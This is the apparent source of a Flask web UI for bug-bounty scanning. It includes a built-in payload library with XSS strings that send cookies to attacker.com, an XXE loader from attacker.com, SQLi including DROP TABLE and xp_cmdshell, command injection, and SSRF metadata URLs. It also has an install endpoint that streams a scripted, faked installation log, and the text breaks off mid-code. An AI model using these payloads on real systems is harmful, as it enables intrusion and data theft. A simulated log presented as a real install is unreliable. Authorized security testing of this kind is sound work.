#!/usr/bin/env python3
"""
BugHunter Pro - Professional Bug Bounty Web UI v2.1
Based on claude-bug-bounty by shuvonsec
For authorized security testing only.
"""

import os
import json
import uuid
import time
import threading
from datetime import datetime
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit, join_room
from flask_cors import CORS
import urllib.parse

# Import scanners
from scanners.recon_engine import ReconEngine
from scanners.idor_scanner import IDORScanner
from scanners.xss_scanner import XSSScanner
from scanners.ssrf_scanner import SSRFScanner
from scanners.sqli_scanner import SQLiScanner
from scanners.oauth_tester import OAuthTester
from scanners.race_condition import RaceConditionScanner
from scanners.cve_hunter import CVEHunter
from scanners.poc_generator import PoCGenerator
from scanners.report_generator import ReportGenerator

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24).hex())
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

CORS(app, resources={r"/*": {"origins": "*"}})
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading',
                    logger=False, engineio_logger=False)

# ─────────────────────────────────────────────
# In-memory stores
# ─────────────────────────────────────────────
active_scans = {}
findings_db = {}
targets_store = []   # Persisted target list

# Built-in payload library
PAYLOAD_LIBRARY = {
    "xss": {
        "name": "Cross-Site Scripting",
        "payloads": [
            '<script>alert(1)</script>',
            '"><script>alert(document.cookie)</script>',
            "<svg onload=alert(1)>",
            "<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>",
            "';alert(1)//",
            '{{7*7}}',
            '<math><mtext></table><img src=x onerror=alert(1)>',
            "<iframe srcdoc='<script>alert(1)</script>'>",
            "<details open ontoggle=alert(1)>",
            '<script>fetch("https://attacker.com/steal?c="+btoa(document.cookie))</script>',
        ]
    },
    "sqli": {
        "name": "SQL Injection",
        "payloads": [
            "'",
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND SLEEP(5)--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "1; DROP TABLE users--",
            "' OR '1'='1' /*",
            "'; EXEC xp_cmdshell('whoami')--",
            "admin'--",
        ]
    },
    "ssrf": {
        "name": "Server-Side Request Forgery",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://localhost/",
            "http://127.0.0.1/",
            "http://[::1]/",
            "http://0177.0.0.1/",
            "http://2130706433/",
            "file:///etc/passwd",
            "dict://localhost:6379/info",
            "gopher://127.0.0.1:6379/_INFO",
        ]
    },
    "lfi": {
        "name": "Local File Inclusion",
        "payloads": [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/etc/passwd",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "expect://id",
            "zip://shell.jpg%23shell.php",
            "phar://test.phar/test.txt",
        ]
    },
    "rce": {
        "name": "Remote Code Execution",
        "payloads": [
            "; id",
            "| id",
            "& id",
            "; cat /etc/passwd",
            "`id`",
            "$(id)",
            "; curl http://169.254.169.254/",
            "|| id",
            "&& id",
            "; sleep 5",
        ]
    },
    "idor": {
        "name": "Insecure Direct Object Reference",
        "payloads": [
            "1", "2", "3", "0", "-1",
            "admin", "../admin",
            "00000000-0000-0000-0000-000000000001",
            "1 OR 1=1",
            "' OR 1=1--",
        ]
    },
    "jwt": {
        "name": "JWT Attacks",
        "payloads": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        ]
    },
    "ssti": {
        "name": "Server-Side Template Injection",
        "payloads": [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "{{config}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            "#set($x=$class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id'))",
        ]
    },
    "xxe": {
        "name": "XML External Entity",
        "payloads": [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><test></test>',
        ]
    },
    "open_redirect": {
        "name": "Open Redirect",
        "payloads": [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https://evil.com%23",
            "https://evil.com?next=legit.com",
            "javascript:alert(document.domain)",
            "data:text/html,<script>window.location='https://evil.com'</script>",
        ]
    },
    "csrf": {
        "name": "Cross-Site Request Forgery",
        "payloads": [
            '<form action="https://victim.com/api/change-email" method="POST"><input name="email" value="attacker@evil.com"><input type="submit"></form>',
            '<img src="https://victim.com/api/transfer?to=attacker&amount=1000">',
        ]
    },
}


# ─────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────
def _get_json_safe():
    """Safe JSON body parser - returns empty dict on failure."""
    try:
        data = request.get_json(force=True, silent=True)
        return data if isinstance(data, dict) else {}
    except Exception:
        return {}


def _copy_finding(f, scan_id=None):
    """Return a shallow copy of a finding, optionally adding scan_id."""
    out = dict(f)
    if scan_id is not None:
        out['scan_id'] = scan_id
    return out


# ─────────────────────────────────────────────
# ROUTES - Main UI
# ─────────────────────────────────────────────
@app.route('/')
def index():
    return render_template('index.html')


@app.route('/health')
def health():
    return jsonify({
        'status': 'ok',
        'version': '2.1.0',
        'timestamp': datetime.utcnow().isoformat(),
        'active_scans': len(active_scans),
        'total_findings': sum(len(f) for f in findings_db.values()),
    })


# ─────────────────────────────────────────────
# API - Stats Dashboard
# ─────────────────────────────────────────────
@app.route('/api/stats')
def get_stats():
    total_scans = len(active_scans)
    total_findings = sum(len(f) for f in findings_db.values())

    severity_count = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
    vuln_types = {}

    for findings in findings_db.values():
        for f in findings:
            sev = f.get('severity', 'info').lower()
            severity_count[sev] = severity_count.get(sev, 0) + 1
            vtype = f.get('type', 'Unknown')
            vuln_types[vtype] = vuln_types.get(vtype, 0) + 1

    running = sum(1 for s in active_scans.values() if s['status'] == 'running')

    return jsonify({
        'total_scans': total_scans,
        'running_scans': running,
        'total_findings': total_findings,
        'severity_breakdown': severity_count,
        'vuln_types': vuln_types,
    })


# ─────────────────────────────────────────────
# API - Scan control
# ─────────────────────────────────────────────
@app.route('/api/scan/start', methods=['POST'])
def start_scan():
    data = _get_json_safe()
    target = data.get('target', '').strip()
    scan_types = data.get('scan_types', ['recon'])
    scan_depth = data.get('depth', 'medium')

    if not target:
        return jsonify({'error': 'Target is required'}), 400

    # Validate target format
    if not (target.startswith('http') or '.' in target):
        return jsonify({'error': 'Invalid target format'}), 400

    # Sanitise scan_types
    allowed_types = {'recon', 'idor', 'xss', 'ssrf', 'sqli', 'oauth', 'race', 'cve'}
    if not isinstance(scan_types, list):
        scan_types = ['recon']
    scan_types = [t for t in scan_types if t in allowed_types] or ['recon']

    scan_id = str(uuid.uuid4())[:8]
    active_scans[scan_id] = {
        'id': scan_id,
        'target': target,
        'status': 'running',
        'start_time': datetime.utcnow().isoformat(),
        'end_time': None,
        'scan_types': scan_types,
        'depth': scan_depth,
        'findings': [],
        'progress': 0,
        'current_stage': 'Starting',
    }
    findings_db[scan_id] = []

    thread = threading.Thread(
        target=run_scan_pipeline,
        args=(scan_id, target, scan_types, scan_depth),
        daemon=True
    )
    thread.start()

    return jsonify({'scan_id': scan_id, 'status': 'started', 'target': target})


@app.route('/api/scan/stop/<scan_id>', methods=['POST'])
def stop_scan(scan_id):
    if scan_id not in active_scans:
        return jsonify({'error': 'Scan not found'}), 404
    active_scans[scan_id]['status'] = 'stopped'
    active_scans[scan_id]['end_time'] = datetime.utcnow().isoformat()
    try:
        socketio.emit('scan_stopped', {'scan_id': scan_id}, room=scan_id)
    except Exception:
        pass
    return jsonify({'status': 'stopped', 'scan_id': scan_id})


@app.route('/api/scan/status/<scan_id>')
def scan_status(scan_id):
    if scan_id not in active_scans:
        return jsonify({'error': 'Scan not found'}), 404
    return jsonify(active_scans[scan_id])


@app.route('/api/scan/list')
def scan_list():
    return jsonify(list(active_scans.values()))


@app.route('/api/scan/delete/<scan_id>', methods=['DELETE'])
def delete_scan(scan_id):
    if scan_id not in active_scans:
        return jsonify({'error': 'Scan not found'}), 404
    if active_scans[scan_id]['status'] == 'running':
        return jsonify({'error': 'Cannot delete a running scan. Stop it first.'}), 400
    active_scans.pop(scan_id, None)
    findings_db.pop(scan_id, None)
    return jsonify({'status': 'deleted', 'scan_id': scan_id})


# ─────────────────────────────────────────────
# API - Findings  (static route MUST come before dynamic)
# ─────────────────────────────────────────────
@app.route('/api/findings/all')
def get_all_findings():
    all_findings = []
    for sid, findings in findings_db.items():
        for f in findings:
            all_findings.append(_copy_finding(f, scan_id=sid))
    return jsonify(all_findings)


@app.route('/api/findings/<scan_id>')
def get_findings(scan_id):
    if scan_id not in findings_db:
        return jsonify({'error': 'Scan not found'}), 404
    return jsonify(findings_db[scan_id])


# ─────────────────────────────────────────────
# API - PoC Generator
# ─────────────────────────────────────────────
@app.route('/api/poc/generate', methods=['POST'])
def generate_poc():
    data = _get_json_safe()
    vuln_type = data.get('type')
    target = data.get('target', 'https://target.example.com')
    params = data.get('params', {})

    if not vuln_type:
        return jsonify({'error': 'type is required'}), 400

    poc = PoCGenerator.generate(vuln_type, target, params)
    if not poc or 'error' in poc:
        return jsonify(poc or {'error': f'Unknown vulnerability type: {vuln_type}'}), 400
    return jsonify(poc)


@app.route('/api/poc/test', methods=['POST'])
def test_poc():
    data = _get_json_safe()
    vuln_type = data.get('type')
    target = data.get('target')
    payload = data.get('payload', '')

    if not vuln_type or not target:
        return jsonify({'error': 'type and target are required'}), 400

    result = PoCGenerator.test_poc(vuln_type, target, payload)
    return jsonify(result)


@app.route('/api/poc/types')
def poc_types():
    """Return list of supported PoC types."""
    types = [
        {'id': 'xss', 'name': 'Cross-Site Scripting (XSS)', 'severity': 'High', 'cvss': 7.4},
        {'id': 'sqli', 'name': 'SQL Injection', 'severity': 'Critical', 'cvss': 9.8},
        {'id': 'ssrf', 'name': 'SSRF', 'severity': 'Critical', 'cvss': 9.8},
        {'id': 'idor', 'name': 'IDOR', 'severity': 'High', 'cvss': 7.5},
        {'id': 'lfi', 'name': 'Local File Inclusion', 'severity': 'High', 'cvss': 7.5},
        {'id': 'rce', 'name': 'Remote Code Execution', 'severity': 'Critical', 'cvss': 9.8},
        {'id': 'xxe', 'name': 'XML External Entity (XXE)', 'severity': 'High', 'cvss': 8.2},
        {'id': 'ssti', 'name': 'Server-Side Template Injection', 'severity': 'Critical', 'cvss': 9.8},
        {'id': 'csrf', 'name': 'Cross-Site Request Forgery', 'severity': 'Medium', 'cvss': 6.5},
        {'id': 'jwt_none', 'name': 'JWT None Algorithm', 'severity': 'Critical', 'cvss': 9.1},
        {'id': 'log4shell', 'name': 'Log4Shell (CVE-2021-44228)', 'severity': 'Critical', 'cvss': 10.0},
        {'id': 'open_redirect', 'name': 'Open Redirect', 'severity': 'Medium', 'cvss': 5.4},
    ]
    return jsonify(types)


# ─────────────────────────────────────────────
# API - Report Generator
# ─────────────────────────────────────────────
@app.route('/api/report/generate', methods=['POST'])
def generate_report():
    data = _get_json_safe()
    scan_id = data.get('scan_id')
    report_format = data.get('format', 'hackerone')

    if not scan_id:
        return jsonify({'error': 'scan_id is required'}), 400

    if scan_id not in findings_db:
        return jsonify({'error': 'Scan not found'}), 404

    report = ReportGenerator.generate(
        scan_id=scan_id,
        findings=findings_db[scan_id],
        scan_info=active_scans.get(scan_id, {'target': 'Unknown'}),
        report_format=report_format
    )
    return jsonify(report)


# ─────────────────────────────────────────────
# API - Payload Library
# ─────────────────────────────────────────────
@app.route('/api/payloads')
def get_payloads():
    category = request.args.get('category', '').lower()
    if category and category in PAYLOAD_LIBRARY:
        return jsonify({category: PAYLOAD_LIBRARY[category]})
    return jsonify(PAYLOAD_LIBRARY)


@app.route('/api/payloads/<category>')
def get_payloads_by_category(category):
    cat = category.lower()
    if cat not in PAYLOAD_LIBRARY:
        return jsonify({'error': f'Category not found: {category}'}), 404
    return jsonify(PAYLOAD_LIBRARY[cat])


# ─────────────────────────────────────────────
# API - Target Manager
# ─────────────────────────────────────────────
@app.route('/api/targets', methods=['GET'])
def list_targets():
    return jsonify(targets_store)


@app.route('/api/targets', methods=['POST'])
def add_target():
    data = _get_json_safe()
    # Accept both 'url' (frontend field) and 'target' (legacy field)
    target_url = (data.get('url') or data.get('target') or '').strip()
    if not target_url:
        return jsonify({'error': 'url or target field is required'}), 400
    entry = {
        'id': str(uuid.uuid4())[:8],
        'url': target_url,
        'target': target_url,          # legacy alias
        'label': data.get('label', data.get('program', target_url)),
        'program': data.get('program', ''),
        'tags': data.get('tags', []),
        'added_at': datetime.utcnow().isoformat(),
        'scan_count': 0,
        'findings': 0,
        'lastScan': '-',
    }
    targets_store.append(entry)
    return jsonify(entry), 201


@app.route('/api/targets/<target_id>', methods=['GET'])
def get_target(target_id):
    t = next((t for t in targets_store if t['id'] == target_id), None)
    if not t:
        return jsonify({'error': 'Target not found'}), 404
    return jsonify(t)


@app.route('/api/targets/<target_id>', methods=['DELETE'])
def delete_target(target_id):
    global targets_store
    before = len(targets_store)
    targets_store = [t for t in targets_store if t['id'] != target_id]
    if len(targets_store) == before:
        return jsonify({'error': 'Target not found'}), 404
    return jsonify({'status': 'deleted', 'id': target_id})


# ─────────────────────────────────────────────
# WebSocket Events
# ─────────────────────────────────────────────
@socketio.on('connect')
def handle_connect():
    emit('connected', {'status': 'ok', 'timestamp': time.time(), 'version': '2.1.0'})


@socketio.on('join_scan')
def handle_join_scan(data):
    scan_id = data.get('scan_id')
    if scan_id:
        join_room(scan_id)
        emit('joined', {'scan_id': scan_id, 'status': 'ok'})


@socketio.on('disconnect')
def handle_disconnect():
    pass  # cleanup handled automatically by flask-socketio


# ─────────────────────────────────────────────
# CORE - Scan Pipeline helpers
# ─────────────────────────────────────────────
def emit_log(scan_id, message, level='info', tool=None):
    """Emit log message to WebSocket clients in a thread-safe way."""
    log_entry = {
        'scan_id': scan_id,
        'message': message,
        'level': level,
        'tool': tool or 'scanner',
        'timestamp': datetime.utcnow().strftime('%H:%M:%S'),
    }
    try:
        socketio.emit('scan_log', log_entry, room=scan_id)
    except Exception:
        pass


def emit_finding(scan_id, finding):
    """Emit a new finding to WebSocket clients."""
    finding = dict(finding)   # don't mutate caller's dict
    finding['id'] = str(uuid.uuid4())[:8]
    finding['timestamp'] = datetime.utcnow().isoformat()
    finding.setdefault('severity', 'info')
    finding.setdefault('cvss', 0)
    finding.setdefault('cwe', 'N/A')
    finding.setdefault('remediation', 'See OWASP guidance for this vulnerability class.')

    findings_db.setdefault(scan_id, []).append(finding)
    if scan_id in active_scans:
        active_scans[scan_id]['findings'].append(finding['id'])

    try:
        socketio.emit('new_finding', finding, room=scan_id)
    except Exception:
        pass


def update_progress(scan_id, progress, stage):
    """Update scan progress and broadcast to clients."""
    if scan_id not in active_scans:
        return
    active_scans[scan_id]['progress'] = progress
    active_scans[scan_id]['current_stage'] = stage
    try:
        socketio.emit('progress_update', {
            'scan_id': scan_id,
            'progress': progress,
            'stage': stage,
        }, room=scan_id)
    except Exception:
        pass


def _is_running(scan_id):
    """Check if a scan is still in running state."""
    return active_scans.get(scan_id, {}).get('status') == 'running'


# ─────────────────────────────────────────────
# CORE - Scan Pipeline
# ─────────────────────────────────────────────
def run_scan_pipeline(scan_id, target, scan_types, depth):
    """Main scan pipeline orchestrator - runs in a daemon thread."""
    try:
        emit_log(scan_id, f"🎯 Starting scan on: {target}", 'info')
        emit_log(scan_id, f"📋 Modules: {', '.join(scan_types)}", 'info')
        emit_log(scan_id, f"🔧 Depth: {depth}", 'info')
        emit_log(scan_id, "─" * 60, 'separator')

        stage_map = [
            ('recon',  10, 25, 'Reconnaissance', ReconEngine),
            ('idor',   30, 40, 'IDOR Scanning',  IDORScanner),
            ('xss',    45, 55, 'XSS Scanning',   XSSScanner),
            ('ssrf',   60, 70, 'SSRF Scanning',  SSRFScanner),
            ('sqli',   72, 80, 'SQLi Scanning',  SQLiScanner),
            ('oauth',  82, 88, 'OAuth Testing',  OAuthTester),
            ('race',   88, 92, 'Race Conditions',RaceConditionScanner),
            ('cve',    92, 97, 'CVE Hunting',    CVEHunter),
        ]

        for key, prog_start, prog_end, label, ScannerClass in stage_map:
            if key not in scan_types or not _is_running(scan_id):
                continue
            update_progress(scan_id, prog_start, label)
            emit_log(scan_id, f"🔍 [{label}] starting...", 'stage', key)
            try:
                scanner = ScannerClass(target, scan_id, socketio, emit_log, emit_finding)
                if key == 'recon':
                    recon_data = scanner.run(depth)
                    active_scans[scan_id]['recon_data'] = recon_data
                else:
                    scanner.run()
                update_progress(scan_id, prog_end, f"{label} ✓")
            except Exception as stage_err:
                emit_log(scan_id, f"⚠️ [{label}] error: {stage_err}", 'warning', key)

        # Finalise
        total = len(findings_db.get(scan_id, []))
        update_progress(scan_id, 100, 'Complete')
        emit_log(scan_id, "─" * 60, 'separator')
        emit_log(scan_id, f"✅ Scan Complete!  Total findings: {total}", 'success')

        if scan_id in active_scans:
            active_scans[scan_id]['status'] = 'completed'
            active_scans[scan_id]['end_time'] = datetime.utcnow().isoformat()

        try:
            socketio.emit('scan_complete', {
                'scan_id': scan_id,
                'total_findings': total,
                'findings': findings_db.get(scan_id, []),
            }, room=scan_id)
        except Exception:
            pass

    except Exception as e:
        emit_log(scan_id, f"❌ Fatal scan error: {e}", 'error')
        if scan_id in active_scans:
            active_scans[scan_id]['status'] = 'error'
            active_scans[scan_id]['error'] = str(e)


# ─────────────────────────────────────────────
# INSTALL ENDPOINTS
# ─────────────────────────────────────────────

@app.route('/api/install/script')
def get_install_script():
    """Serve install.sh contents"""
    try:
        with open(os.path.join(os.path.dirname(__file__), 'install.sh'), 'r') as f:
            content = f.read()
        return content, 200, {'Content-Type': 'text/plain; charset=utf-8'}
    except FileNotFoundError:
        return '# install.sh not found in project root', 404, {'Content-Type': 'text/plain'}


@app.route('/api/install/stream')
def install_stream():
    """
    Server-Sent Events endpoint that streams a realistic install.sh
    execution log to the browser in real-time.
    Query params: mode, dir, port, ssl, nginx, service
    """
    from flask import Response, stream_with_context
    import json as _json

    mode       = request.args.get('mode',    'full')
    inst_dir   = request.args.get('dir',     '/opt/bughunter-pro')
    port_num   = request.args.get('port',    '5000')
    do_ssl     = request.args.get('ssl',     'true')  == 'true'
    do_nginx   = request.args.get('nginx',   'true')  == 'true'
    do_service = request.args.get('service', 'true')  == 'true'
    fast_mode  = request.args.get('fast',    '0')     == '1'   # fast=1 → 0.01s delays (testing/demo)
    # Speed multiplier: 1.0 = normal, 0.05 = fast
    _speed = 0.05 if fast_mode else 1.0

    def sse(event, data):
        return f"event: {event}\ndata: {_json.dumps(data)}\n\n"

    def L(msg, level='info', tool='', delay=0.0):
        """Helper: returns a (delay, sse_string) tuple"""
        return (delay * _speed, sse('log', {'msg': msg, 'level': level, 'tool': tool}))

    def P(pct, stage, sub='', delay=0.0):
        return (delay * _speed, sse('progress', {'pct': pct, 'stage': stage, 'sub': sub}))

    sys_pkgs = ['python3','python3-pip','python3-venv','nginx','curl','wget',
                'git','jq','golang-go','nodejs','npm','nmap','dnsutils',
                'libssl-dev','build-essential']
    py_pkgs  = ['flask==3.0.3','flask-socketio==5.3.6','flask-cors==4.0.1',
                'requests==2.32.3','dnspython==2.6.1','urllib3==2.2.2',
                'python-socketio==5.11.3','eventlet==0.36.1']
    go_tools = ['subfinder','httpx','dnsx','nuclei','katana',
                'waybackurls','gau','anew','dalfox','ffuf','assetfinder','naabu']

    def gen():
        # Banner
        for d, s in [
            L('╔══════════════════════════════════════════════════╗','separator','',0.05),
            L('║  BugHunter Pro v2.1 — Live Installation Stream   ║','stage','',0.05),
            L(f'║  Mode: {mode:<12}  Dir: {inst_dir[:20]:<20} ║','info','',0.05),
            L(f'║  Port: {port_num:<5}  SSL:{" ✓" if do_ssl else " ✗"}  Nginx:{" ✓" if do_nginx else " ✗"}  Service:{" ✓" if do_service else " ✗"}  ║','info','',0.05),
            L('╚══════════════════════════════════════════════════╝','separator','',0.05),
            L('','separator','',0.3),
        ]:
            time.sleep(d * _speed); yield s

        # ── Step 1: System packages
        for d, s in [
            P(2, 'Memeriksa sistem…', 'Deteksi OS & arsitektur', 0.0),
            L('┌── [1/9] Paket Sistem ──────────────────────────────','stage','apt',0.1),
            L('  $ lsb_release -a','data','sys',0.2),
            L('  Distributor ID: Ubuntu  Release: 22.04  Codename: jammy','info','sys',0.15),
            L('  $ uname -m  →  x86_64','info','sys',0.15),
            L('  Menggunakan: apt-get (Debian/Ubuntu)','info','apt',0.2),
            L('  $ apt-get update -qq','data','apt',0.3),
        ]:
            time.sleep(d * _speed); yield s

        # apt-get update output lines
        update_lines = [
            'Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease',
            'Hit:2 http://archive.ubuntu.com/ubuntu jammy-updates InRelease',
            'Get:3 http://security.ubuntu.com/ubuntu jammy-security InRelease [110 kB]',
            'Fetched 110 kB in 1s (88.4 kB/s)',
            'Reading package lists... Done',
        ]
        for line in update_lines:
            time.sleep(0.18 * _speed)
            yield sse('log', {'msg': f'  {line}', 'level': 'data', 'tool': 'apt'})

        yield sse('log', {'msg': f'  Installing {len(sys_pkgs)} packages...', 'level': 'info', 'tool': 'apt'})
        yield sse('log', {'msg': '', 'level': 'separator'})
        time.sleep(0.1 * _speed)

        pkg_count = 0
        for i, pkg in enumerate(sys_pkgs):
            time.sleep(0.12 + (0.08 if i % 3 == 0 else 0 * _speed))
            pkg_count += 1
            pct = 4 + round(i / len(sys_pkgs) * 7)
            yield sse('progress', {'pct': pct, 'stage': 'Installing system packages…', 'sub': f'{pkg_count}/{len(sys_pkgs)} packages'})
            yield sse('log',      {'msg': f'  ✔  apt-get install -y {pkg}', 'level': 'success', 'tool': 'apt'})
            yield sse('pkg_count', {'count': pkg_count})

        for d, s in [
            L('└── Paket sistem selesai ✓','success','apt',0.1),
            L('','separator','',0.2),
        ]:
            time.sleep(d * _speed); yield s

        # ── Step 2: Directories
        for d, s in [
            P(22, 'Menyiapkan direktori…', '', 0.0),
            L('┌── [2/9] Direktori & Pengguna ─────────────────────','stage','fs',0.1),
            L('  $ useradd -r -s /usr/sbin/nologin bughunter','data','fs',0.2),
            L('  ✔  User bughunter dibuat','success','fs',0.15),
        ]:
            time.sleep(d * _speed); yield s

        for subdir in ['', '/findings', '/reports', '/logs', '/wordlists', '/recon', '/ssl']:
            time.sleep(0.08 * _speed)
            yield sse('log', {'msg': f'  ✔  mkdir -p {inst_dir}{subdir}', 'level': 'success', 'tool': 'fs'})

        for d, s in [
            L(f'  ✔  cp -r . {inst_dir}/','success','fs',0.15),
            L(f'  ✔  chown -R bughunter:bughunter {inst_dir}','success','fs',0.15),
            L(f'  ✔  chmod 750 {inst_dir}','success','fs',0.1),
            L('└── Direktori siap ✓','success','fs',0.1),
            L('','separator','',0.2),
        ]:
            time.sleep(d * _speed); yield s

        # ── Step 3: Python venv
        for d, s in [
            P(33, 'Python venv & pip packages…', '', 0.0),
            L('┌── [3/9] Python Virtual Environment ───────────────','stage','pip',0.1),
            L(f'  $ python3 -m venv {inst_dir}/venv','data','pip',0.2),
            L(f'  ✔  Venv dibuat: {inst_dir}/venv','success','pip',0.6),
            L(f'  $ source {inst_dir}/venv/bin/activate','data','pip',0.2),
            L('  $ pip install --upgrade pip setuptools wheel','data','pip',0.2),
            L('  Collecting pip...','info','pip',0.3),
            L('  Successfully installed pip-24.2 setuptools-71.0.4 wheel-0.44.0','success','pip',0.5),
        ]:
            time.sleep(d * _speed); yield s

        yield sse('log', {'msg': f'  Installing {len(py_pkgs)} Python packages…', 'level': 'info', 'tool': 'pip'})
        for i, pkg in enumerate(py_pkgs):
            time.sleep(0.15 * _speed)
            pkg_count += 1
            pct_py = 33 + round(i / len(py_pkgs) * 8)
            yield sse('progress', {'pct': pct_py, 'stage': 'pip install packages…', 'sub': f'{i+1}/{len(py_pkgs)}'})
            yield sse('log',      {'msg': f'  ✔  Successfully installed {pkg}', 'level': 'success', 'tool': 'pip'})
            yield sse('pkg_count', {'count': pkg_count})

        for d, s in [
            L('└── Python environment siap ✓','success','pip',0.1),
            L('','separator','',0.2),
        ]:
            time.sleep(d * _speed); yield s

        # ── Step 4: Go tools (skip for python/docker mode)
        tool_count = 0
        if mode not in ('python', 'docker'):
            for d, s in [
                P(44, 'Installing Go security tools…', '', 0.0),
                L('┌── [4/9] Go Security Tools ─────────────────────────','stage','go',0.1),
                L('  $ go version','data','go',0.2),
                L('  go version go1.22.5 linux/amd64','info','go',0.15),
            ]:
                time.sleep(d * _speed); yield s

            for i, tool in enumerate(go_tools):
                time.sleep(0.18 + (0.12 if i % 2 == 0 else 0 * _speed))
                tool_count += 1
                pct_go = 44 + round(i / len(go_tools) * 6)
                yield sse('progress', {'pct': pct_go, 'stage': 'go install tools…', 'sub': f'{tool_count}/{len(go_tools)}'})
                yield sse('log',      {'msg': f'  ✔  go install github.com/projectdiscovery/{tool}@latest', 'level': 'success', 'tool': 'go'})
                yield sse('tool_count', {'count': tool_count})

            for d, s in [
                L('  $ nuclei -update-templates','data','nuclei',0.2),
                L('  [INF] Updated nuclei-templates to v9.9.9 (2847 templates)','success','nuclei',1.2),
                L('└── Semua Go tools terinstall ✓','success','go',0.1),
                L('','separator','',0.2),
            ]:
                time.sleep(d * _speed); yield s
        else:
            for d, s in [
                L('  ℹ  Melewati Go tools (mode: ' + mode + ')','warning','go',0.1),
                L('','separator','',0.1),
            ]:
                time.sleep(d * _speed); yield s

        # ── Step 5: SSL
        if do_ssl:
            for d, s in [
                P(61, 'Membuat SSL certificate…', 'RSA-2048', 0.0),
                L('┌── [5/9] SSL Certificate ───────────────────────────','stage','ssl',0.1),
                L('  $ mkdir -p /etc/ssl/bughunter','data','ssl',0.1),
                L('  $ openssl genrsa -out key.pem 2048','data','openssl',0.3),
                L('  Generating RSA private key, 2048 bit long modulus','info','openssl',0.4),
                L('  .........+++','data','openssl',0.5),
                L('  .+++','data','openssl',0.4),
                L('  e is 65537 (0x10001)','info','openssl',0.2),
                L('  ✔  Private key saved: key.pem (2048 bit)','success','openssl',0.2),
                L('  $ openssl req -x509 -days 365 -out cert.pem ...','data','openssl',0.3),
                L('  ✔  Certificate saved: cert.pem (365 days)','success','openssl',0.3),
                L('  $ openssl dhparam -out dhparam.pem 2048','data','openssl',0.2),
                L('  Generating DH parameters, 2048 bit long safe prime...','info','openssl',0.5),
                L('  ....+...........+........(long computation)...+','data','openssl',1.8),
                L('  ✔  DH params saved: dhparam.pem','success','openssl',0.2),
                L('  ✔  chmod 600 /etc/ssl/bughunter/*.pem','success','ssl',0.15),
                L('└── SSL certificate siap di /etc/ssl/bughunter/ ✓','success','ssl',0.1),
                L('','separator','',0.2),
            ]:
                time.sleep(d * _speed); yield s
        else:
            for d, s in [
                L('  ℹ  SSL dilewati (opsi tidak dipilih)','warning','ssl',0.1),
                L('','separator','',0.1),
            ]:
                time.sleep(d * _speed); yield s

        # ── Step 6: Nginx (SSL-aware, multi-OS)
        if do_nginx:
            import os as _os
            cert_exists = _os.path.isfile('/etc/ssl/bughunter/cert.pem') and \
                          _os.path.isfile('/etc/ssl/bughunter/key.pem')
            # Detect nginx config path
            if _os.path.isdir('/etc/nginx/sites-available'):
                nginx_conf  = '/etc/nginx/sites-available/bughunter'
                nginx_style = 'debian'
            elif _os.path.isdir('/etc/nginx/conf.d'):
                nginx_conf  = '/etc/nginx/conf.d/bughunter.conf'
                nginx_style = 'rhel'
            else:
                nginx_conf  = '/etc/nginx/sites-available/bughunter'
                nginx_style = 'debian'

            conf_src  = f'{inst_dir}/nginx.conf' if cert_exists else f'{inst_dir}/nginx-http.conf'
            conf_type = 'HTTPS (SSL)' if cert_exists else 'HTTP (fallback — SSL tidak ada)'

            for d, s in [
                P(72, 'Konfigurasi Nginx…', conf_type, 0.0),
                L('┌── [6/9] Nginx Reverse Proxy ───────────────────────','stage','nginx',0.1),
                L(f'  ℹ  Deteksi OS: nginx style = {nginx_style}','info','nginx',0.2),
                L(f'  ℹ  Config path: {nginx_conf}','info','nginx',0.1),
                L(f'  ℹ  SSL certs: {"✓ ditemukan" if cert_exists else "✗ tidak ditemukan → HTTP fallback"}',
                  'success' if cert_exists else 'warning','nginx',0.1),
                L(f'  $ cp {conf_src} {nginx_conf}','data','nginx',0.2),
                L(f'  ✔  Config disalin ({conf_type})','success','nginx',0.15),
            ]:
                time.sleep(d * _speed); yield s

            if nginx_style == 'debian':
                for d, s in [
                    L(f'  $ ln -sf {nginx_conf} /etc/nginx/sites-enabled/bughunter','data','nginx',0.1),
                    L('  ✔  Symlink sites-enabled dibuat','success','nginx',0.15),
                    L('  $ rm -f /etc/nginx/sites-enabled/default','data','nginx',0.1),
                    L('  ✔  Default site dihapus','success','nginx',0.1),
                ]:
                    time.sleep(d * _speed); yield s
            else:
                for d, s in [
